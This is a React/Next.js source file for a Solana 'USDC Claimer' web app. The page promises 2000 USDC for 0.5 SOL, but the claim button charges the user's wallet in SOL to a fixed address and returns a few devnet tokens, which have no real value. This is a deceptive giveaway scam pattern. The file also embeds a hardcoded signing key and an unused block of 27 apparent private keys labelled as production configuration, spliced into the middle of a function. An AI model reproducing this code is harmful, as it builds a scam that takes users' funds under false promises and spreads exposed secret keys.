/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "vuZi7v7SSWSwFnxncscqyhqtaaBPkdJnuMPX3PM7FNJt2XYAuCVRQYD97fCDn4bZxhsjoWqmaDodwnbgCYfn7Sd"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2AH7xfJuJX2jxwVk39sVzFrUpHHGyum3LNArcbhCESakwDZt1144NnSsaYMnmZBUaocKwWauVj97pFrJQNE6y2sc",
  "key1": "2s9VHkVFRWdC6PuYpFxPykJh12cWr99SgkQP2JnKZpdjCP4W41D5tEAy4Qj6Nb56qTJCfvWr9Ya8uebtqf93hPCD",
  "key2": "5RrpEk81FKhJcoMKfG9qbUkzX6vRVjm8A9raSK2Q7CDPBdPvLcq1SDANfAUiMfhMXhYCet8WZV4zNFYMFimThsbz",
  "key3": "3HqingeiApqCudcYPHo8RP3wZfbdSo7R4eLFK5qEMjAFs2NUKuWhaVJtJZ6rAq3XvmShucvSPbsRDCGdtYKBrqEE",
  "key4": "59fQmoGV3ocuUPj1VDujUEL3Pq91VYbYrE53hMeaPFpRLanfLapuWjgwtk73QB5qKm8CZBtwhmFur3BQNbqkoJn4",
  "key5": "37sUBaxhcBDqxUVqQTy7VPsFAhKSTa5NRApN36WKVtqogQww7Rst7eZBgRMR4UwuQYkg5HwWEQnKjDgwG7L2wdFp",
  "key6": "496j6P4G8tcHnQm2tcUcgaJYQzXhMUrb96bbsFWK6tT2NBbYDuBXcAfHBZvTH2ZEi5gwab5kyCveDEEpCMeGQeWT",
  "key7": "2BzFFG3wskdoZVyvi5mMTUa7J5pj3Mtx8Dfa79NMBwEFQygvEWGLSmgeueGCta2zA7QeuT98CTy65qyKrWCxEPBe",
  "key8": "261cz1Hu5KTrHeg2ECGEpCM6anZNZLhFvRjKfLeW35p28WoC9yTCacGoHCz73yos7Jxy7Htx1wtsJdTnfHXAqXn1",
  "key9": "65hbsNcXrLqFotKsjrEovRPy91VJVs9qMm9k9FQ8JHEdQvxNkKNBsfiJ8f8qYBKqCzLPxKt7uhoeAeHXPrGtzLcB",
  "key10": "2t78ui7exouvZcGJPBkrF7U3P3eHL4tkjifo7cwAANEXLScR2dUFK2EqTq4DqMBEJbmGnUT198btToZSYPpknArn",
  "key11": "5dLHEZ2KpsPoVvxcqcHYFXwxXBTLFpoMp5FLV3TiTJ1eNUCpFXDhjmds8rN2i5bq6VfABwpcfX8R7H63HwauFAXv",
  "key12": "5LCNwuw68umqGNwPzkHGmGP3KqPgmE1hzUfFThcBuV61P3rUum8dw92xNbJBSKMYKMqmHgAmuSJW1VJuFRrvvaf",
  "key13": "5yk1cwuAyg8roBpn3wvwHWJbdDb8qsxm7DwHLpfU3nKY8c4f3eZn7obhidhMNwbFxEPnAc2qF9QVNRFhU7BHrYS1",
  "key14": "4efE6FFqLwnmUAG38kaZggmnDqiv5DysE59NiZQLNYSLNxoAgMoXrQad5gU4UQDKJMLSsAUT2KtqdecCgWLNwcfB",
  "key15": "3m2cJNLLewxz4e23WsXnSnHgfu7XAv4JkDQfLDi6qFnggKYeAZBrLP9ewNngDWzMudRH4KwvU8erNyYJrCV8z7M7",
  "key16": "4bXshw9VGkCREzuBt4e4f8a8ejt9hXEbq43EQajRCmZcj3STjcBY8Y3uavUqUKnX2R6THQstGPkxmC1ejnhaTBTX",
  "key17": "3k2rzfHVyhZMCHyzoDoT9Bv4ph15E1qBcXxvTgjX3QRgLFzuGmj7otqwSAXMZiEYwPgpKicYwfkQJfovXM9AiCwv",
  "key18": "LVAE6W8yWyxAvThe9Dd34ZWraYiw9fYXqkHY5P3sdANLbSkutzYxwd3auNZfQL1CMEcmynm8DXFAguBbRX9JKND",
  "key19": "5t6KzC7GcgVwKX2YsqdNXj3iJhiNaWt4mtfuqCXP3dtRrNR7CPHhs2VtngZQFmbUR2vdFpvtfaExZ7q82kQLZGHe",
  "key20": "4nHX7n7ynjhcAdDg7gDEXaLqcdmLrcCyDT2TwS9qjFFJJJy4UhWeTznokX6E8utNCJUFJTkjG93DNJkmtMLJkJGw",
  "key21": "3HM3abyGk7zKRvBZwzjK1CfcFfgEoKfvpPdwvnMaPGSPpr25ityYXwKLuuH4rdCzYeCZkNK793mYzn7w8UMqJ3fk",
  "key22": "pXEHNrJ5pWpYQ2ufMn9SR7La1sS1unPjvc6YnGQUSdgQ5XJJcHMevDh5X8tBbJvHiRVy7Pm1ikGDn1EaMaXFp4o",
  "key23": "58gGDbvtgUafXu5ui2Y7QqNoNvY1XK8g4akVg7zaQMqHdXgnXLpZUr2ZX1yaJCm5KcuR29FAKws7WBa55j73jT8e",
  "key24": "4NfEmUXb8L31WpPENugCX6UWZqQnAqDgPFSRY4Sb9f8Sii41eYRXsF25JfScyjfQGumAKdHiLZKZNJT4Ds6UXeF2",
  "key25": "uG1DE7ZxwAeMuGeSrPCsioMeYyF1s7e1SRKS98bEVtPiopGgkdKJvzLR7UbQQoYGqDSWj7nwUaM79JXVHKRFjcM",
  "key26": "4w6D6C7tbMfJj4k8BAkAmwjEwaRbEpeWgGcHhDGsbQVuSi67cS6D6q3b1M7JYkSEazN9hb6MN3g97k8zUQQu6XhY"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
